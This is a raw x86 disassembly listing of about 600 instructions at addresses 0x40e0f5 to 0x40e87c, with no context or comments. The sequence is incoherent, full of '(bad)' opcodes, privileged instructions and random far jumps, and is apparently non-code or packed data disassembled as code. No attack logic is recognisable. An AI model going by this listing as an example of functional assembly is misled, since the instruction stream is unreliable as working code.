  40e0f5:	mov    esp,0xbea23d98
  40e0fa:	inc    ecx
  40e0fb:	icebp  
  40e0fc:	xor    DWORD PTR [eax],edx
  40e0fe:	out    0x4c,eax
  40e100:	dec    ecx
  40e101:	sub    al,0x33
  40e103:	or     BYTE PTR [ebx+0x29777c06],bh
  40e109:	mov    al,ds:0xec08ebd2
  40e10e:	das    
  40e10f:	mov    es:0x57014edb,al
  40e115:	outs   dx,DWORD PTR ds:[esi]
  40e116:	xor    cl,ch
  40e118:	mov    cl,0xa0
  40e11a:	lods   eax,DWORD PTR ds:[esi]
  40e11b:	mov    WORD PTR [eax+0x73a8d113],?
  40e121:	mov    bh,0x4a
  40e123:	gs mov ebx,0xf42fd908
  40e129:	shl    BYTE PTR [edi+0x7ee50b89],1
  40e12f:	mov    al,BYTE PTR [edx]
  40e131:	ror    DWORD PTR [edi-0x57],0x4f
  40e135:	inc    edx
  40e136:	pop    eax
  40e137:	lsl    ecx,WORD PTR [eax+0x7ddee286]
  40e13e:	pop    eax
  40e13f:	lods   al,BYTE PTR ds:[esi]
  40e140:	in     eax,0xff
  40e142:	imul   eax,DWORD PTR [edx+eiz*1-0x2376ac28],0xffffffaf
  40e14a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e14b:	stc    
  40e14c:	cmp    dh,dh
  40e14e:	dec    eax
  40e14f:	in     eax,dx
  40e150:	adc    ecx,DWORD PTR [ebx]
  40e152:	jp     0x40e170
  40e154:	cmp    eax,0x49b404f7
  40e159:	sub    DWORD PTR [ebp+ebp*4-0x14],eax
  40e15d:	(bad)  
  40e15e:	hlt    
  40e15f:	inc    ebp
  40e160:	stos   DWORD PTR es:[edi],eax
  40e161:	push   ss
  40e162:	cs pop edi
  40e164:	mov    ds:0xf67c9e66,al
  40e169:	jne    0x40e1d2
  40e16b:	fst    DWORD PTR [ebx+0x72abd91f]
  40e171:	clc    
  40e172:	add    bh,BYTE PTR [edx-0x2f]
  40e175:	inc    ecx
  40e176:	scas   al,BYTE PTR es:[edi]
  40e177:	and    al,0xc9
  40e179:	xchg   ebp,eax
  40e17a:	stos   BYTE PTR es:[edi],al
  40e17b:	mov    ds:0xa4cd84a2,al
  40e180:	jno    0x40e200
  40e182:	clc    
  40e183:	call   0x85033314
  40e188:	icebp  
  40e189:	lods   eax,DWORD PTR ds:[esi]
  40e18a:	cld    
  40e18b:	pop    ebp
  40e18c:	ret    0xa69a
  40e18f:	pop    esi
  40e190:	mov    esp,0x4759590c
  40e195:	or     al,0x9b
  40e197:	dec    edx
  40e198:	push   ecx
  40e199:	add    eax,0xd74d583e
  40e19e:	dec    ecx
  40e19f:	cs inc esp
  40e1a1:	or     ebx,DWORD PTR [ecx]
  40e1a3:	push   eax
  40e1a4:	cmp    DWORD PTR ds:0x4a544d41,edi
  40e1aa:	jmp    0xbf28:0x4f9f1c15
  40e1b1:	fcomp  DWORD PTR [edi]
  40e1b3:	outs   dx,BYTE PTR ds:[esi]
  40e1b4:	push   ebx
  40e1b5:	inc    esi
  40e1b6:	and    eax,0x4e97c2c6
  40e1bb:	fisttp DWORD PTR [ecx-0x13]
  40e1be:	outs   dx,BYTE PTR ds:[esi]
  40e1bf:	cmp    esp,ebp
  40e1c1:	mov    ds:0x7dc1f94e,al
  40e1c6:	mov    DWORD PTR [eax+ebp*2+0x5e6e6060],esp
  40e1cd:	ins    DWORD PTR es:[edi],dx
  40e1ce:	inc    ebx
  40e1cf:	imul   eax,DWORD PTR [esi],0x459294c7
  40e1d5:	loopne 0x40e1c8
  40e1d7:	adc    al,0x4e
  40e1d9:	pusha  
  40e1da:	push   ss
  40e1db:	and    eax,0x69b89be7
  40e1e0:	push   0xffffff8b
  40e1e2:	pop    esp
  40e1e3:	ret    0xb752
  40e1e6:	in     eax,0x80
  40e1e8:	xchg   DWORD PTR [edx-0x7d],edi
  40e1eb:	xchg   esp,eax
  40e1ec:	std    
  40e1ed:	jnp    0x40e209
  40e1ef:	(bad)  
  40e1f0:	adc    ebp,esi
  40e1f2:	sub    al,0xc6
  40e1f4:	push   edx
  40e1f5:	xor    al,0x92
  40e1f7:	ret    
  40e1f8:	or     bl,BYTE PTR [ecx+0x4bf6b2b]
  40e1fe:	es fxch st(7)
  40e201:	mov    esi,0xc84f8177
  40e206:	jmp    0x40e228
  40e208:	mov    ch,0xd2
  40e20a:	jmp    0xf2f1:0xeb5a4338
  40e211:	xchg   edx,eax
  40e212:	pop    ss
  40e213:	dec    ebx
  40e214:	cmovle esi,ebx
  40e217:	mov    ch,0x59
  40e219:	sub    bl,0xf5
  40e21c:	shl    BYTE PTR [bx],cl
  40e21f:	jg     0x40e22c
  40e221:	cmp    al,0x84
  40e223:	test   BYTE PTR [ebx-0x41b6a63a],dl
  40e229:	or     bl,BYTE PTR [ebx]
  40e22b:	push   ebp
  40e22c:	mov    al,0xbf
  40e22e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e22f:	ss mov edx,0x9cb599c2
  40e235:	sbb    ah,0x29
  40e238:	call   0x8f6ab673
  40e23d:	sub    esp,edx
  40e23f:	sub    DWORD PTR [ebp-0x27],eax
  40e242:	mov    edi,0x3e61cd61
  40e247:	das    
  40e248:	or     eax,0x7c9f97bd
  40e24d:	cmp    eax,0xe602e133
  40e252:	ins    DWORD PTR es:[edi],dx
  40e253:	sahf   
  40e254:	or     esp,DWORD PTR [eax+0x5b]
  40e257:	arpl   bp,si
  40e259:	in     eax,dx
  40e25a:	dec    eax
  40e25b:	add    ch,dh
  40e25d:	lahf   
  40e25e:	mov    ah,0xc6
  40e260:	dec    edx
  40e261:	popa   
  40e262:	or     BYTE PTR [ebx+edx*1-0xf],bh
  40e266:	sub    eax,0x5880e9bd
  40e26b:	sbb    ah,BYTE PTR [esi-0x5ecb7575]
  40e271:	popf   
  40e272:	cmp    al,0x3e
  40e274:	dec    ecx
  40e276:	xchg   edx,eax
  40e277:	retf   0x499f
  40e27a:	push   ecx
  40e27b:	int3   
  40e27c:	aaa    
  40e27d:	into   
  40e27e:	ret    
  40e27f:	xor    dl,BYTE PTR [eax]
  40e281:	pop    ebx
  40e282:	inc    edx
  40e283:	cmp    DWORD PTR [edx+0x73],esp
  40e286:	pushf  
  40e287:	inc    BYTE PTR [esi]
  40e289:	(bad)  [ebp-0x3d2ba737]
  40e28f:	mov    WORD PTR [ebp+0x21ab9e11],?
  40e295:	sub    eax,0x8a7775c3
  40e29a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e29b:	stos   BYTE PTR es:[edi],al
  40e29c:	push   edx
  40e29d:	push   0x5f25e162
  40e2a2:	xor    eax,eax
  40e2a4:	out    0x1a,eax
  40e2a6:	xor    edx,esp
  40e2a8:	xlat   BYTE PTR ds:[ebx]
  40e2a9:	mov    DWORD PTR [eax-0x9757afd],esp
  40e2af:	icebp  
  40e2b0:	aad    0xe6
  40e2b2:	jnp    0x40e307
  40e2b4:	push   edx
  40e2b5:	imul   edi,DWORD PTR [eax],0x50
  40e2b8:	jb     0x40e29e
  40e2ba:	imul   edx,DWORD PTR [esi+0x53822e12],0xffffffc6
  40e2c1:	in     al,0x4e
  40e2c3:	call   0x2088:0x3bfcacc3
  40e2ca:	dec    esi
  40e2cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2cc:	or     ah,BYTE PTR [edx-0x73]
  40e2cf:	in     eax,dx
  40e2d0:	and    ebp,DWORD PTR [ebx+0x6427c5c8]
  40e2d6:	das    
  40e2d7:	gs inc edx
  40e2d9:	pop    ss
  40e2da:	inc    esi
  40e2db:	lds    edi,FWORD PTR es:[ebx-0x3e]
  40e2df:	pushf  
  40e2e0:	push   ebp
  40e2e1:	and    al,0x78
  40e2e3:	cdq    
  40e2e4:	inc    edx
  40e2e5:	test   al,0xcf
  40e2e7:	xchg   BYTE PTR [edi+0x516905c8],cl
  40e2ed:	pop    edx
  40e2ee:	ins    BYTE PTR es:[edi],dx
  40e2ef:	add    BYTE PTR [eax+0x58],bh
  40e2f2:	outs   dx,DWORD PTR ds:[esi]
  40e2f3:	xchg   ebx,eax
  40e2f4:	adc    DWORD PTR [ebp+0x208ab14a],ecx
  40e2fa:	xchg   ebp,eax
  40e2fb:	or     al,0x7
  40e2fd:	mov    ebp,0x8f5c9714
  40e302:	xlat   BYTE PTR ds:[ebx]
  40e303:	push   ecx
  40e304:	adc    al,0x67
  40e306:	inc    ebx
  40e307:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e308:	cdq    
  40e309:	cld    
  40e30a:	inc    edx
  40e30b:	adc    eax,0x7eb4105a
  40e310:	cmp    eax,0x552bd16a
  40e315:	push   es
  40e316:	push   0x53
  40e318:	adc    DWORD PTR [ebp-0x65ffcfef],edx
  40e31e:	xchg   edx,eax
  40e31f:	pushf  
  40e320:	int    0x7
  40e322:	mov    ecx,0x2805629d
  40e327:	jns    0x40e31b
  40e329:	test   bl,dh
  40e32b:	je     0x40e303
  40e32d:	jecxz  0x40e2d1
  40e32f:	mov    ecx,0xa366d8f2
  40e334:	mov    esi,0xf1622100
  40e339:	aad    0x77
  40e33b:	jle    0x40e39d
  40e33d:	xchg   edx,eax
  40e33e:	enter  0x361d,0x2f
  40e342:	test   BYTE PTR [edx+0x239b521],bh
  40e348:	jns    0x40e2e9
  40e34a:	or     eax,0x9ff625fb
  40e34f:	stos   BYTE PTR es:[edi],al
  40e350:	mov    DWORD PTR [edx+0x3f8e0431],ebp
  40e356:	std    
  40e357:	fbstp  TBYTE PTR [ecx+0x2d]
  40e35a:	jns    0x40e30d
  40e35c:	shl    BYTE PTR [edx+esi*8-0x75],0xb7
  40e361:	ds test al,0x22
  40e364:	jp     0x40e345
  40e366:	dec    esi
  40e367:	mov    bh,0x85
  40e369:	call   0xeaf9:0x3de3e2de
  40e370:	xchg   esi,eax
  40e371:	iret   
  40e372:	inc    ebp
  40e373:	sbb    eax,esp
  40e375:	jne    0x40e390
  40e377:	ja     0x40e302
  40e379:	jl     0x40e36f
  40e37b:	jae    0x40e3ca
  40e37d:	(bad)  
  40e37e:	shl    BYTE PTR [ecx+0x10],1
  40e381:	jl     0x40e3f1
  40e383:	mov    ebx,DWORD PTR [ebp+0x251825f1]
  40e389:	hlt    
  40e38a:	mov    ecx,0x660c2e33
  40e38f:	es call 0x13119b1e
  40e395:	push   edi
  40e396:	nop
  40e397:	fwait
  40e398:	mov    dh,0xd0
  40e39a:	fldlg2 
  40e39c:	in     al,0x45
  40e39e:	jecxz  0x40e38c
  40e3a0:	fisttp DWORD PTR ds:0xac2cbd15
  40e3a6:	or     bl,BYTE PTR ss:[edx]
  40e3a9:	aad    0x59
  40e3ab:	in     eax,dx
  40e3ac:	std    
  40e3ad:	or     eax,0x394dfd43
  40e3b2:	bound  esi,QWORD PTR [ebx]
  40e3b4:	es mov dl,0x2e
  40e3b7:	push   esi
  40e3b8:	test   BYTE PTR [ecx+0x29],0x5b
  40e3bc:	mov    ch,0x4c
  40e3be:	cmp    ah,BYTE PTR [ecx+0x1c]
  40e3c1:	loop   0x40e347
  40e3c3:	jge    0x40e40d
  40e3c5:	nop
  40e3c6:	dec    ecx
  40e3c7:	mov    ch,BYTE PTR [eax]
  40e3c9:	imul   eax,esp,0x2ee1a878
  40e3cf:	mov    edi,0x36461e38
  40e3d4:	repnz mov ebp,DWORD PTR [ecx+0x5d]
  40e3d8:	or     ebp,edi
  40e3da:	fcomp  QWORD PTR [edi+0x3f]
  40e3dd:	rcl    bl,1
  40e3df:	push   edi
  40e3e0:	into   
  40e3e1:	push   ebx
  40e3e2:	add    dh,BYTE PTR [edx]
  40e3e4:	in     eax,dx
  40e3e5:	xchg   ebp,eax
  40e3e6:	jo     0x40e449
  40e3e8:	popf   
  40e3e9:	sbb    BYTE PTR [ecx-0x3b],cl
  40e3ec:	dec    ebp
  40e3ed:	shl    edi,0x2f
  40e3f0:	mov    al,ds:0xdf22d1b8
  40e3f5:	xchg   edx,eax
  40e3f6:	(bad)  
  40e3f7:	cmp    DWORD PTR [edx],esi
  40e3f9:	outs   dx,DWORD PTR ds:[si]
  40e3fb:	(bad)  
  40e3fc:	aad    0x90
  40e3fe:	repnz and DWORD PTR [ebp-0x4a],esp
  40e402:	push   eax
  40e403:	sbb    dl,BYTE PTR [edi]
  40e405:	adc    dl,BYTE PTR [eax+0x71068844]
  40e40b:	or     eax,0x9b18fcba
  40e410:	or     bh,BYTE PTR [esi+ecx*1+0x9e744e3]
  40e417:	lea    ebp,[ebp-0x32ff01f]
  40e41d:	and    BYTE PTR [esi-0x6f],dl
  40e420:	mov    bh,0xd
  40e422:	mov    ds,WORD PTR [edi-0x6edc735d]
  40e428:	sub    BYTE PTR [ecx],cl
  40e42a:	push   ebx
  40e42b:	cdq    
  40e42c:	fwait
  40e42d:	test   BYTE PTR [esi-0x7],dl
  40e430:	sub    al,0xb4
  40e432:	add    al,0x8d
  40e434:	xchg   DWORD PTR [edx],eax
  40e436:	daa    
  40e437:	push   ebp
  40e438:	(bad)  
  40e439:	out    0x23,al
  40e43b:	out    dx,al
  40e43c:	pop    esp
  40e43d:	and    DWORD PTR [edi-0x1b],0xffffffb1
  40e441:	cmp    BYTE PTR [esi],cl
  40e443:	xor    al,0xb6
  40e445:	xchg   ebp,eax
  40e446:	or     BYTE PTR [edx-0x3b],ah
  40e449:	xchg   ecx,eax
  40e44a:	cmp    eax,0xbe3c3026
  40e44f:	pop    ss
  40e450:	pop    ebp
  40e451:	fpatan 
  40e453:	mov    ds:0xd89bfdfb,eax
  40e458:	adc    BYTE PTR [ebx-0x2e9dc3dd],bl
  40e45e:	pop    esi
  40e45f:	repnz cmp DWORD PTR [ebp+0x2d],ebp
  40e463:	iret   
  40e464:	adc    al,0xc9
  40e466:	add    cl,BYTE PTR [ebp-0x5388fcd5]
  40e46c:	add    BYTE PTR [edi],ah
  40e46e:	(bad)  
  40e46f:	sar    BYTE PTR [edx+0x13244e0b],1
  40e475:	hlt    
  40e476:	xchg   ebx,eax
  40e477:	(bad)  
  40e478:	out    0x11,eax
  40e47a:	imul   edx,DWORD PTR [ebp+0x45],0xffffffe6
  40e47e:	or     al,0xa9
  40e480:	aad    0x59
  40e482:	(bad)  
  40e483:	pop    ss
  40e484:	shr    DWORD PTR [esp+ebx*4+0x39],cl
  40e488:	jmp    0x6fbd:0x94ecd4b8
  40e48f:	sub    BYTE PTR [eax+eiz*1-0x5474cff8],dh
  40e496:	iret   
  40e497:	mov    bh,0x55
  40e499:	sub    al,0x8b
  40e49b:	(bad)  
  40e49c:	mov    ecx,0x3db2adad
  40e4a1:	inc    edx
  40e4a2:	sbb    bl,BYTE PTR [eax+ebp*1-0x7e18f4bb]
  40e4a9:	ret    0x819a
  40e4ac:	xor    DWORD PTR [ecx+0x52],eax
  40e4af:	mov    bl,0x3a
  40e4b1:	push   ecx
  40e4b2:	jge    0x40e49d
  40e4b4:	push   edi
  40e4b5:	ss je  0x40e464
  40e4b8:	(bad)  
  40e4b9:	jmp    0xa47f:0x3b6030af
  40e4c0:	fwait
  40e4c1:	inc    esi
  40e4c2:	and    esi,DWORD PTR [esi]
  40e4c4:	mov    ebp,0xb66ff148
  40e4c9:	cmp    al,0xc9
  40e4cb:	pop    eax
  40e4cc:	ret    
  40e4cd:	int3   
  40e4ce:	mov    al,ds:0xe61880e4
  40e4d3:	xchg   BYTE PTR [edx+ebx*4],ch
  40e4d6:	int3   
  40e4d7:	sbb    bl,BYTE PTR [edi-0x63]
  40e4da:	ror    bl,1
  40e4dc:	push   es
  40e4dd:	sub    eax,0xcc9f89ae
  40e4e2:	mov    bh,0xe3
  40e4e4:	inc    cl
  40e4e6:	add    edx,edi
  40e4e8:	out    0x1b,al
  40e4ea:	xchg   ch,bl
  40e4ec:	xchg   BYTE PTR [edx+ebx*8],ch
  40e4ef:	aaa    
  40e4f0:	ror    DWORD PTR [eax+0x11],0xdb
  40e4f4:	mov    ss:0x60660f8b,eax
  40e4fa:	in     al,dx
  40e4fb:	mov    dh,ch
  40e4fd:	sub    eax,0xecc7f3a1
  40e502:	cmp    eax,0x873c8706
  40e507:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e509:	pop    es
  40e50a:	inc    esi
  40e50b:	jo     0x40e4d1
  40e50d:	or     DWORD PTR [eax],edx
  40e50f:	sub    BYTE PTR [ebp-0x4c],dl
  40e512:	ds scas al,BYTE PTR es:[edi]
  40e514:	xor    bh,BYTE PTR [eax]
  40e516:	test   BYTE PTR [eax+0x2c9fba7f],dh
  40e51c:	popf   
  40e51d:	das    
  40e51e:	aam    0xe6
  40e520:	int    0x77
  40e522:	jno    0x40e4b5
  40e524:	mov    eax,0x2ed03696
  40e529:	and    BYTE PTR [ecx],ch
  40e52b:	pushf  
  40e52c:	add    DWORD PTR [ebx+0x5fe0550c],edi
  40e532:	(bad)  
  40e533:	jno    0x40e559
  40e535:	stos   BYTE PTR es:[edi],al
  40e536:	je     0x40e4c9
  40e538:	xchg   esp,eax
  40e539:	sbb    DWORD PTR [edi-0x62],edi
  40e53c:	inc    esp
  40e53d:	lods   eax,DWORD PTR ds:[esi]
  40e53e:	mov    bl,0xdb
  40e540:	cmp    edx,DWORD PTR [ecx]
  40e542:	ret    0x1ae7
  40e545:	cmp    dh,BYTE PTR [esi+esi*2+0x11]
  40e549:	and    edi,0xcb144b47
  40e54f:	ss and dl,ah
  40e552:	dec    esp
  40e553:	test   bh,cl
  40e555:	aas    
  40e556:	enter  0xa7a,0xa
  40e55a:	adc    dh,dl
  40e55c:	ja     0x40e4f3
  40e55e:	pop    edi
  40e55f:	out    0xbb,eax
  40e561:	je     0x40e4f7
  40e563:	mov    BYTE PTR [edi+0x9],cl
  40e566:	paddd  mm7,QWORD PTR [edx+0x5d57c8ba]
  40e56d:	jns    0x40e554
  40e56f:	mov    bl,bh
  40e571:	adc    eax,0xcc5ff228
  40e576:	sub    dl,BYTE PTR [ecx-0x41]
  40e579:	push   ss
  40e57a:	inc    ecx
  40e57b:	fistp  WORD PTR [ebx+0x5bafdeb]
  40e581:	(bad)  
  40e582:	(bad)  
  40e584:	push   ebx
  40e585:	xchg   al,ah
  40e587:	jb     0x40e511
  40e589:	aad    0x12
  40e58b:	or     DWORD PTR [eax+edx*8+0x7c0469a2],esi
  40e592:	cmp    DWORD PTR [ebp-0x2a],edi
  40e595:	les    ebp,FWORD PTR [ecx]
  40e597:	test   eax,0x54b82e4
  40e59c:	or     esp,DWORD PTR [edx-0x7994cc58]
  40e5a2:	sti    
  40e5a3:	(bad)  
  40e5a4:	(bad)  
  40e5a5:	call   0x7a4e7c70
  40e5aa:	and    esp,eax
  40e5ac:	adc    DWORD PTR ds:0x9654fb21,edi
  40e5b2:	scas   eax,DWORD PTR es:[edi]
  40e5b3:	dec    esi
  40e5b4:	test   eax,0x66d36fb7
  40e5b9:	mov    ax,0x5124
  40e5bd:	out    0xd4,eax
  40e5bf:	jmp    0x40e5b8
  40e5c1:	xor    dl,BYTE PTR [ecx+0x75]
  40e5c4:	fld    TBYTE PTR [eax]
  40e5c6:	inc    edx
  40e5c7:	xlat   BYTE PTR ds:[ebx]
  40e5c8:	pop    esi
  40e5c9:	jae    0x40e5a1
  40e5cb:	push   cs
  40e5cc:	sub    ebp,ebx
  40e5ce:	push   ss
  40e5cf:	clc    
  40e5d0:	sbb    esp,DWORD PTR [edi-0x38]
  40e5d3:	and    al,0x4e
  40e5d5:	mul    BYTE PTR [ebp+0x42]
  40e5d8:	mov    bl,0x24
  40e5da:	pop    eax
  40e5db:	jnp    0x40e654
  40e5dd:	ins    BYTE PTR es:[edi],dx
  40e5de:	mov    bl,0x8d
  40e5e0:	pop    edx
  40e5e1:	mov    dl,0xcc
  40e5e3:	xchg   edx,eax
  40e5e4:	push   ebx
  40e5e5:	jbe    0x40e5c1
  40e5e7:	retf   0x399
  40e5ea:	xor    BYTE PTR [ecx],al
  40e5ec:	pop    esi
  40e5ed:	xor    bh,BYTE PTR [ecx-0x3b]
  40e5f0:	xchg   edx,eax
  40e5f1:	retf   
  40e5f2:	ins    DWORD PTR es:[edi],dx
  40e5f3:	out    dx,al
  40e5f4:	sub    al,0xc6
  40e5f6:	add    DWORD PTR [ecx-0x70],0xffffffc1
  40e5fa:	es and bh,bl
  40e5fd:	push   edx
  40e5fe:	loope  0x40e67b
  40e600:	call   0x3515af70
  40e605:	fwait
  40e606:	sub    ebx,DWORD PTR [ebp-0x63]
  40e609:	or     DWORD PTR [ebx-0x57833911],esi
  40e60f:	fist   DWORD PTR [eax]
  40e611:	mov    edi,0x641c02c7
  40e616:	imul   ebp,DWORD PTR [ecx],0xcab1fa2b
  40e61c:	arpl   WORD PTR [ecx-0x2822cf89],dx
  40e622:	aad    0xb6
  40e624:	ja     0x40e69f
  40e626:	cmp    eax,0x38978cc1
  40e62b:	hlt    
  40e62c:	cli    
  40e62d:	sbb    edx,esi
  40e62f:	ins    BYTE PTR es:[edi],dx
  40e630:	mov    dh,BYTE PTR [ecx+0x57]
  40e633:	rcr    DWORD PTR [edi+eiz*2],1
  40e636:	fnsave [ebx]
  40e638:	adc    BYTE PTR [edx+0x72],dh
  40e63b:	xor    cl,ch
  40e63d:	loope  0x40e637
  40e63f:	mov    ecx,0x61f9fd97
  40e644:	mov    eax,ds:0xd1e6b64b
  40e649:	jmp    0x13a7:0xc74c7646
  40e650:	sub    BYTE PTR [ecx],cl
  40e652:	dec    edx
  40e653:	(bad)  
  40e654:	mov    al,ds:0xf0d507be
  40e659:	xchg   edx,eax
  40e65a:	dec    ebx
  40e65b:	inc    ebp
  40e65c:	push   ebp
  40e65d:	cmp    DWORD PTR [edx-0x4f],0xffffffc2
  40e661:	(bad)  [esi+0x539563f2]
  40e667:	pop    esp
  40e668:	push   esp
  40e669:	call   0x83cc:0xd14810a0
  40e670:	cdq    
  40e671:	xlat   BYTE PTR ds:[ebx]
  40e672:	cmc    
  40e673:	es (bad) 
  40e675:	pop    eax
  40e676:	cdq    
  40e677:	stc    
  40e678:	leave  
  40e679:	push   cs
  40e67a:	(bad)  
  40e67b:	mov    eax,0x62767a78
  40e680:	or     bh,BYTE PTR [edi-0x71]
  40e683:	jmp    0xcc27:0x90f6eeaf
  40e68a:	iret   
  40e68b:	push   edi
  40e68c:	or     eax,DWORD PTR [edi+0x5c7c9a56]
  40e692:	dec    esi
  40e693:	es xor eax,0x63869be7
  40e699:	imul   ecx,ebx,0x96234405
  40e69f:	sbb    esi,ebp
  40e6a1:	mov    WORD PTR [edi],cs
  40e6a3:	aas    
  40e6a4:	and    ch,0x6
  40e6a7:	push   ebp
  40e6a8:	dec    ebx
  40e6a9:	mov    edx,0xe6a2fdd6
  40e6ae:	pop    ebp
  40e6af:	cdq    
  40e6b0:	adc    eax,0x987cdc6d
  40e6b5:	xor    al,0xbb
  40e6b7:	cdq    
  40e6b8:	div    DWORD PTR [eax+edx*4-0x48]
  40e6bc:	cld    
  40e6bd:	sahf   
  40e6be:	call   FWORD PTR [eax]
  40e6c0:	push   esp
  40e6c1:	jne    0x40e684
  40e6c3:	mov    gs,WORD PTR [edi-0x731ad11b]
  40e6c9:	(bad)  
  40e6ca:	sbb    al,0x82
  40e6cc:	leave  
  40e6cd:	repz dec eax
  40e6cf:	in     eax,dx
  40e6d0:	inc    DWORD PTR [edx+0x40]
  40e6d3:	pop    edx
  40e6d4:	fwait
  40e6d5:	call   DWORD PTR [ebx+edi*8]
  40e6d8:	ss and eax,0xaf72c677
  40e6de:	xor    cl,BYTE PTR [esi-0x328a5675]
  40e6e4:	out    0x2f,al
  40e6e6:	xor    BYTE PTR [ecx],dh
  40e6e8:	xor    BYTE PTR [edx],bh
  40e6ea:	xchg   ebx,eax
  40e6eb:	in     eax,0x9a
  40e6ed:	stos   BYTE PTR es:[edi],al
  40e6ee:	call   0xa7f02f5c
  40e6f3:	mov    dl,BYTE PTR [eax]
  40e6f5:	push   edi
  40e6f6:	lods   al,BYTE PTR ds:[esi]
  40e6f7:	mov    fs,ebp
  40e6f9:	jge    0x40e716
  40e6fb:	xchg   ecx,eax
  40e6fc:	mov    bh,0x3a
  40e6fe:	jmp    0x40e73f
  40e700:	mov    ds:0xaa06fe82,al
  40e705:	mov    al,ds:0x127335bf
  40e70a:	sbb    al,0x12
  40e70c:	or     dh,ah
  40e70e:	loope  0x40e76a
  40e710:	inc    edx
  40e711:	xor    ecx,DWORD PTR [edx-0x67d94d7b]
  40e717:	xchg   BYTE PTR [edi+0x24],bh
  40e71a:	int    0xbf
  40e71c:	push   0x96ef3703
  40e721:	imul   edi,ecx,0xffffff85
  40e724:	mov    ch,0x56
  40e726:	sub    bl,al
  40e728:	out    0x4e,eax
  40e72a:	inc    ebx
  40e72b:	jge    0x40e766
  40e72d:	mov    ebx,0x73bc4630
  40e732:	jmp    0x40e6e9
  40e734:	xor    DWORD PTR [ebx],ebp
  40e736:	xor    esp,DWORD PTR [ecx+ebx*8+0x39]
  40e73a:	jmp    0x2ed7:0xd648e5c
  40e741:	adc    ch,cl
  40e743:	mov    ds:0xe66672bd,al
  40e748:	shr    edx,1
  40e74a:	jns    0x40e6fe
  40e74c:	cmp    bl,ah
  40e74e:	and    ebp,esi
  40e750:	sub    BYTE PTR [edx],ah
  40e752:	cmp    eax,0xd4845308
  40e757:	mov    cl,BYTE PTR [ebp-0x17fee9d0]
  40e75d:	mov    eax,0xa0c962c2
  40e762:	add    DWORD PTR [esi-0x2256b9fb],ecx
  40e768:	mov    ecx,0xb1e9bfcb
  40e76d:	inc    eax
  40e76e:	ins    DWORD PTR es:[edi],dx
  40e76f:	ret    
  40e770:	test   al,0xab
  40e772:	dec    eax
  40e773:	push   edx
  40e774:	mov    eax,ds:0x52f27918
  40e779:	je     0x40e728
  40e77b:	cwde   
  40e77c:	fiadd  DWORD PTR [esi+0x59e6fe07]
  40e782:	mov    ebx,DWORD PTR [eax]
  40e784:	jnp    0x40e7a7
  40e786:	out    0x6e,eax
  40e788:	mov    DWORD PTR [edi+0x77acb534],0xdb84174f
  40e792:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e793:	clc    
  40e794:	adc    BYTE PTR [ebx+0x620226eb],bh
  40e79a:	sub    BYTE PTR [eax-0x2f6f1e91],0x4d
  40e7a1:	jb     0x40e786
  40e7a3:	iret   
  40e7a4:	clc    
  40e7a5:	fild   QWORD PTR [ecx]
  40e7a7:	mov    dl,0xfe
  40e7a9:	or     DWORD PTR gs:[esi],edx
  40e7ac:	cs repz pop ebp
  40e7af:	push   cs
  40e7b0:	push   ds
  40e7b1:	sub    ecx,eax
  40e7b3:	mov    ch,0x4d
  40e7b5:	cmc    
  40e7b6:	or     BYTE PTR [ebp+0x2adb146c],cl
  40e7bc:	ret    0x64fb
  40e7bf:	push   ds
  40e7c0:	mov    ds:0xee86e0fc,al
  40e7c5:	cli    
  40e7c6:	and    eax,0x7bce332e
  40e7cb:	xor    dh,BYTE PTR [esp+edx*8+0x5a725c1b]
  40e7d2:	rcl    BYTE PTR [edx],1
  40e7d4:	aad    0xc2
  40e7d6:	inc    esp
  40e7d7:	gs and ebx,ebp
  40e7da:	or     ebp,DWORD PTR [edx]
  40e7dc:	les    esi,FWORD PTR [esi]
  40e7de:	mul    DWORD PTR [esi]
  40e7e0:	ds popa 
  40e7e2:	inc    ecx
  40e7e3:	xor    eax,0x6d60db4d
  40e7e8:	mov    edx,0xc67bb16c
  40e7ed:	push   esp
  40e7ee:	loopne 0x40e84d
  40e7f0:	shr    bl,1
  40e7f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7f3:	adc    ecx,DWORD PTR [edx+0x73ba468d]
  40e7f9:	fdivrp st(1),st
  40e7fb:	popa   
  40e7fc:	sti    
  40e7fd:	sbb    DWORD PTR [bx],ecx
  40e800:	mov    BYTE PTR [edx-0x42],dl
  40e803:	pusha  
  40e804:	cmp    al,0x21
  40e806:	push   es
  40e807:	mov    bh,0xcc
  40e809:	push   cs
  40e80a:	and    ch,bh
  40e80c:	(bad)  
  40e80d:	ret    
  40e80e:	adc    eax,0xd4bc9abf
  40e813:	enter  0xd991,0x6f
  40e817:	xchg   BYTE PTR [esi],dl
  40e819:	call   0xc1a7:0x6b25f83a
  40e820:	es popa 
  40e822:	mov    ebp,0xd25ddb01
  40e827:	mov    bh,0x9e
  40e829:	add    eax,0xa3e27b88
  40e82e:	lahf   
  40e82f:	rcr    BYTE PTR [ecx+0x46],1
  40e832:	mov    dh,0x8a
  40e834:	add    al,BYTE PTR [eax]
  40e836:	xchg   ebp,eax
  40e837:	push   ecx
  40e838:	mov    dh,0x56
  40e83a:	mov    edi,0xc6b40a9
  40e83f:	xor    eax,0x9066e62f
  40e844:	jae    0x40e8a5
  40e846:	mov    edi,0x6d0f499e
  40e84b:	scas   eax,DWORD PTR es:[edi]
  40e84c:	or     DWORD PTR [edi-0x6a],0x5f4bde
  40e853:	outs   dx,BYTE PTR ds:[esi]
  40e854:	scas   al,BYTE PTR es:[edi]
  40e855:	fadd   st(6),st
  40e857:	push   esp
  40e858:	cli    
  40e859:	popa   
  40e85a:	leave  
  40e85b:	mov    WORD PTR [ebx-0x5d],fs
  40e85e:	and    eax,0xad06de71
  40e863:	pop    esi
  40e864:	imul   ecx,DWORD PTR [esi],0x29eca40a
  40e86a:	sub    BYTE PTR [edx+0x2fc3c5f],cl
  40e870:	push   ss
  40e871:	pop    ss
  40e872:	popf   
  40e873:	sti    
  40e874:	push   ss
  40e875:	scas   al,BYTE PTR es:[edi]
  40e876:	xor    BYTE PTR [edx-0x7cbb6f17],bh
  40e87c:	fdiv   DWORD PTR [ebp+0x727d6d07]
